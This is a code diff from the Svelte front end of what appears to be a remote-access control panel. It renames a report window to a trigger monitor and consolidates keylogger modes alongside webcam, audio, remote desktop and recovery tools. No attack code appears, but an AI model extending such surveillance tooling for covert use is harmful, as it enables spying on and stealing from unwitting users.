@@ -42,7 +42,7 @@
 	import RemoteDesktopWorkspace from '$lib/components/workspace/tools/remote-desktop-workspace.svelte';
 	import OptionsWorkspace from '$lib/components/workspace/tools/options-workspace.svelte';
 	import ClientChatWorkspace from '$lib/components/workspace/tools/client-chat-workspace.svelte';
-	import ReportWindowWorkspace from '$lib/components/workspace/tools/report-window-workspace.svelte';
+	import TriggerMonitorWorkspace from '$lib/components/workspace/tools/trigger-monitor-workspace.svelte';
 	import IpGeolocationWorkspace from '$lib/components/workspace/tools/ip-geolocation-workspace.svelte';
 	import EnvironmentVariablesWorkspace from '$lib/components/workspace/tools/environment-variables-workspace.svelte';
 	import type { AgentSnapshot } from '../../../../shared/types/agent';
@@ -98,15 +98,14 @@
 		recovery: RecoveryWorkspace,
 		options: OptionsWorkspace,
 		'client-chat': ClientChatWorkspace,
-		'report-window': ReportWindowWorkspace,
+		'trigger-monitor': TriggerMonitorWorkspace,
 		'ip-geolocation': IpGeolocationWorkspace,
 		'environment-variables': EnvironmentVariablesWorkspace
 	} satisfies Partial<Record<DialogToolId, ComponentType>>;
 
 	const keyloggerModes = {
-		'keylogger-online': 'online',
-		'keylogger-offline': 'offline',
-		'keylogger-advanced-online': 'advanced-online'
+		'keylogger-standard': 'standard',
+		'keylogger-offline': 'offline'
 	} as const;
 
 	const workspaceToolIds = new Set<DialogToolId>([
@@ -114,9 +113,8 @@
 		'remote-desktop',
 		'webcam-control',
 		'audio-control',
-		'keylogger-online',
+		'keylogger-standard',
 		'keylogger-offline',
-		'keylogger-advanced-online',
 		'cmd',
 		'file-manager',
 		'task-manager',
@@ -127,7 +125,7 @@
 		'recovery',
 		'options',
 		'client-chat',
-		'report-window',
+		'trigger-monitor',
 		'ip-geolocation',
 		'environment-variables'
 	]);
